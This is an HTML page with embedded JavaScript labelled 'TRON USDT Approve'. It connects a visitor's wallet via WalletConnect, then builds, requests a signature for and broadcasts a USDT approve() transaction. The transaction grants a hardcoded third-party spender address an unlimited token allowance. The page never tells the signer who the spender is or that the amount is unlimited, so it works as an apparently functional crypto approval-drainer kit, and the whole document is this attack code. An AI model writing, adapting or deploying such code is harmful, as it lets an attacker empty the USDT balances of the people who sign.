<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>TRON Approve</title>
<style>
body{background:#0a0a0a;color:#fff;text-align:center;font-family:sans-serif;padding:30px}
.step{margin:10px;padding:10px;background:#111;border-left:4px solid #333}
.active{border-color:#f0a500}
.done{border-color:#22c55e}
.error{border-color:#ef4444}
</style>
</head>

<body>

<h2>TRON USDT Approve</h2>

<div id="s1" class="step">Connect</div>
<div id="s2" class="step">Wallet</div>
<div id="s3" class="step">Build</div>
<div id="s4" class="step">Sign</div>
<div id="s5" class="step">Broadcast</div>

<div id="qr"></div>

<p id="uri"></p>
<a id="link" target="_blank"></a>

<pre id="log"></pre>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script type="module">
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const TRONGRID = "https://api.trongrid.io";

const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

function step(id,s){document.getElementById(id).className="step "+s}
function log(t){document.getElementById("log").textContent+=t+"\n"}

async function toHex(addr){
  const res = await fetch(TRONGRID+"/wallet/validateaddress",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({address:addr})
  });
  const d = await res.json();
  if(!d.result) throw "Invalid address";
  return d.hexAddress;
}

async function encodeApprove(){
  const hex = (await toHex(SPENDER)).slice(2).padStart(64,"0");
  return "095ea7b3"+hex+"f".repeat(64);
}

async function buildTx(owner){
  const ownerHex=(await toHex(owner)).slice(2);

  const res = await fetch(TRONGRID+"/wallet/triggersmartcontract",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      owner_address:ownerHex,
      contract_address:USDT_HEX,
      function_selector:"approve(address,uint256)",
      parameter:await encodeApprove(),
      fee_limit:100000000,
      call_value:0,
      visible:false
    })
  });

  const d=await res.json();
  return d.transaction;
}

function fixSig(resp,tx){
  if(resp.signature){
    tx.signature=[resp.signature.replace(/^0x/,"")];
  }
  return tx;
}

async function broadcast(tx){
  const r=await fetch(TRONGRID+"/wallet/broadcasttransaction",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify(tx)
  });
  return await r.json();
}

async function connect(client){
  step("s1","active");

  const { uri, approval } = await client.connect({
    requiredNamespaces:{
      tron:{
        methods:["tron_signTransaction"],
        chains:[TRON_CHAIN],
        events:[]
      }
    }
  });

  // QR
  document.getElementById("qr").innerHTML="";
  new QRCode(document.getElementById("qr"),{text:uri,width:200,height:200});

  // fallback link
  document.getElementById("uri").textContent=uri;
  const link="https://link.trustwallet.com/wc?uri="+encodeURIComponent(uri);
  document.getElementById("link").href=link;
  document.getElementById("link").textContent="Open in Trust Wallet";

  return await approval();
}

async function main(){
  try{
    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");

    const client = await SignClient.init({
      projectId:PROJECT_ID,
      metadata:{name:"TRON",description:"approve",url:location.origin,icons:[""]}
    });

    let session;

    try{
      session = await connect(client);
    }catch(e){
      log("Retry connect...");
      session = await connect(client); // retry ONCE
    }

    step("s1","done");

    const wallet=session.namespaces.tron.accounts[0].split(":")[2];
    step("s2","done");
    log("Wallet: "+wallet);

    step("s3","active");
    const tx=await buildTx(wallet);
    step("s3","done");

    step("s4","active");
    const signed=await client.request({
      topic:session.topic,
      chainId:TRON_CHAIN,
      request:{method:"tron_signTransaction",params:{transaction:tx}}
    });

    const finalTx=fixSig(signed,tx);
    step("s4","done");

    step("s5","active");
    const res=await broadcast(finalTx);

    if(res.result){
      step("s5","done");
      log("SUCCESS: "+res.txid);
    }else{
      throw JSON.stringify(res);
    }

  }catch(e){
    step("s5","error");
    log("ERROR: "+e);
  }
}

main();
</script>

</body>
</html>
